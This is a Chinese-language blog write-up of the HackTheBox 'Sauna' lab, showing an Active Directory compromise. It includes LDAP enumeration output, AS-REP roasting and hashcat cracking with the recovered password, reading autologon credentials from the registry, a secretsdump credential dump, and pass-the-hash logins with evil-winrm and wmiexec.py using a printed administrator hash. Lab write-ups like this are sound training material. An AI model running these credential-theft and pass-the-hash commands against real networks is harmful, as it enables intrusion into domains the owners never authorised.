---
title: Sauna
date: 2021-12-24 13:54:20
tags: HackThebox
categories: 内网
---

## 靶机信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/0c4f7155f0a144fca320112bb07de39c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 信息收集
发现开放了445，80，88，5985这些常见的可能存在漏洞的端口。因为存在ldap服务，可能考虑到存在内网
![在这里插入图片描述](https://img-blog.csdnimg.cn/18c6ed7749514992adad88f2a6fa97f2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

发现了smb服务，尝试是否可以登录
![在这里插入图片描述](https://img-blog.csdnimg.cn/cae8f24d7edf4d9ab4db6a15e3d5c60b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
登录失败，那我们查看一下ldap有没有什么有价值的信息
![在这里插入图片描述](https://img-blog.csdnimg.cn/f0249267ceca4d73943001c895249779.png)

```bash
ldapsearch -x -H ldap://10.10.10.175 -b "dc=EGOTISTICAL-BANK,dc=local"
```

```bash
# extended LDIF
#
# LDAPv3
# base <dc=EGOTISTICAL-BANK,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#
# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20211018114224.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 98336
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAAJ/uf
 RcDAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA
 AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4
 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==
creationTime: 132790309446175365
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: EGOTISTICAL-BANK
# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL
# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL
# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL
# search result
search: 2
result: 0 Success
# numResponses: 19
# numEntries: 15
# numReferences: 3
```
<!--more-->

我们发现了一个可疑的用户。虽然是找到了用户名，但是我们不没有找到相对应的凭据。这时候我们切换一下思路，浏览一下web服务中有什么有价值的信息可以提供给我们的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/b628002a16b3488681fd917e8308c38f.png)
在关于页面，我们看到了这两个用户的信息，长得貌似和我们信息收集出来的用户信息有点类似。那我们可以猜测这有可能是系统中真实存在的用户。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c588d6ef57d149fabf5e731d9cc5036d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们尝试获取一下用户对应的哈希值，使用的工具是kerbrute，发现存在`hsmith`和`fsmith`这两个用户并且发现了它们的TGT条目。![在这里插入图片描述](https://img-blog.csdnimg.cn/2627486af25c47ab96b900a0ec75f39b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们先使用impacket包中的`GetNPUsers.py`获取fsmith用户的hash值。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c0949aa761a34cd5ac4cb072c102afb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们将他的hash值保存为一个文件，使用hashcat尝试能不能破解成功。破解成功的密码明文值为`Thestrokes23`。这里解释一下参数的含义，-m指的是指定文件的散列值类型，-a指的是指定破解模式，-w是指定字典。

```bash
hashcat -m 18200 -a 0 -w 3 fsmith.hash /usr/share/wordlists/rockyou.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/41e6765292b042028af2e5a18a7e63c0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e09120c6a3ab4d2ebc84502a9a0a58b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/353674983008426c8e5578b2c332cf9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
既然破解到了密码，那我们可以登录SMB和WinRM服务了。我们先查看SMB服务，发现了两个共享服务，但是没有一个是有用的。。。
![在这里插入图片描述](https://img-blog.csdnimg.cn/03e072a109fb4bbea8beb8f0a955ab09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们尝试利用WinRM吧，登录成功，拿到第一个flag值。
![在这里插入图片描述](https://img-blog.csdnimg.cn/6b0e08188c09403f95a20de67f6292de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权
我们拿到的只是普通用户的权限，我们的目标当然是管理员权限。首先我们先看看都存在哪些用户，发现存在一个svc_loanmgr用户。
![在这里插入图片描述](https://img-blog.csdnimg.cn/db445cc21449494680e87b2d7ae329f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们使用powershell命令查看到它对应的密码。

```powershell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d774cd7d287541eb8c6c68b368fe0424.png)
这个命令要记住它还是有一定难度的，我们也可以通过上传`WindowsEnum.ps1`脚本来完成这任务。
![在这里插入图片描述](https://img-blog.csdnimg.cn/86d1160f61414340a78ab8afd834f34a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/8c4904ed1ffe46219f42192926e2b54c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发现这个密码后，我们可以尝试使用登陆进去。但是我试了很多次都是登陆失败
![在这里插入图片描述](https://img-blog.csdnimg.cn/431a23d1a026444781060ce56c83ade6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那没办法了，我尝试使用`secretsdump.py`脚本看看能不能成功获取到这个用户的哈希值。我们意外发现administrator的hash值，发大财了

```bash
secretsdump.py -dc-ip 10.10.10.175 svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/24f4c7e28cee4d33bef37d56e48ad59a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们使用`evil-winrm`进行登录，同时我们还可以使用`wmiexec.py`这个脚本进行登录，但是后者的速度要相较前者慢得多

```bash
evil-winrm -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/42316c86c9ba4720b9fd0f6684ecec19.png)

```bash
wmiexec.py -hashes :823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/b57c846f068946208ef0673c1765edf0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
